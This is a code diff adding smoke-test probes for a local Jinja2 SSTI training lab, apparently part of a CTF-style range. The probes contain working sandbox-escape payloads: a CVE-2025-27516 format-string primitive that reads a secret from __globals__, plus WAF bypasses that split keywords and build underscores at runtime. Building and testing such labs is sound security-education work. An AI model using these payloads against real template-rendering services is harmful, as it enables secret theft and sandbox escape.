@@ -198,9 +198,56 @@ LABS: list[Lab] = [
             ),
         ],
     ),
-    # 05 / 06 的关卡由各自的靶场 README 给出并自测；这里只做接口级冒烟，
-    # 避免把「某条 payload 一定能用」写死在公共脚本里造成脆弱耦合。
-    Lab(key="05", name="05-jinja-sandbox", image="ssti-jinja-sandbox:local"),
+    # 06 的关卡由该靶场自己的 README 与 tests/verify_blind.py 覆盖；
+    # 这里只做接口级冒烟，避免把「某条 payload 一定能用」写死在公共脚本里造成脆弱耦合。
+    Lab(
+        key="05",
+        name="05-jinja-sandbox",
+        image="ssti-jinja-sandbox:local",
+        probes=[
+            # 经典链在 3.1.4/3.1.5/3.1.6 上都该失败 —— 用反向断言把它钉住
+            RenderCheck(
+                "0",
+                "{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}",
+                expect_error="UndefinedError",
+                note="L1 教科书经典链应失败（2.11.3 起 |attr 受沙箱检查）",
+            ),
+            RenderCheck("0", "{{ ''.__class__ }}", "", note="L1 点号取魔术属性应拿不到（渲染成空串）"),
+            RenderCheck(
+                "0",
+                "{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }}",
+                FLAG_TMPL % "05",
+                note="L1 CVE-2025-27516 原语读出内存里的 flag",
+            ),
+            RenderCheck(
+                "1",
+                "{{ [1,2,3].append(4) }}",
+                expect_error="SecurityError",
+                note="L2 immutable 沙箱禁止修改可变对象",
+            ),
+            RenderCheck(
+                "1",
+                "{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }}",
+                FLAG_TMPL % "05",
+                note="L2 同一原语在 immutable 下照样成立",
+            ),
+            RenderCheck("2", "{{ 'format' }}", "WAF", note="L3 字面关键字被拦"),
+            RenderCheck(
+                "2",
+                "{{ (('{0.__glo'~'bals__[SITEDATA][fl'~'ag]}')|attr('for'~'mat'))(helper) }}",
+                FLAG_TMPL % "05",
+                note="L3 拆分关键字 + 整体加括号（| 优先级高于 ~）",
+            ),
+            RenderCheck("3", "{{ '__globals__' }}", "WAF", note="L4 字面下划线被拦"),
+            RenderCheck(
+                "3",
+                "{{ (('{0.'~('%c'|format(95))~('%c'|format(95))~'globals'~('%c'|format(95))"
+                "~('%c'|format(95))~'[SITEDATA][flag]}')|attr('format'))(helper) }}",
+                FLAG_TMPL % "05",
+                note="L4 用 '%c'|format(95) 运行期造下划线",
+            ),
+        ],
+    ),
     Lab(key="06", name="06-blind-ssti", image="ssti-blind:local"),
     Lab(
         key="07",
